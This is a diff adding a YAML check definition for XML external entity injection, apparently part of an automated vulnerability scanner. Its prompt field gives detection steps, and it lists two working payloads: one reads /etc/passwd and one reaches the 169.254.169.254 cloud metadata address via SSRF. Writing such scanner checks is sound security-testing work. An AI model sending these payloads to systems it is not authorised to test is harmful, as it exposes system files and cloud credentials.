@@ -1,0 +1,11 @@
+type: XXE
+name: XML 外部实体注入
+description: XML 解析器处理外部实体，可读文件/SSRF
+need_detect: "目标接收 XML 输入（Content-Type: application/xml 等）"
+prompt: |
+  XXE 检测：
+  1. 构造 DOCTYPE 外部实体读取 /etc/passwd
+  2. 用 distinguish 对比正常请求与 XXE 载荷差异
+payloads:
+  - '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>'
+  - '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/">]><x>&e;</x>'
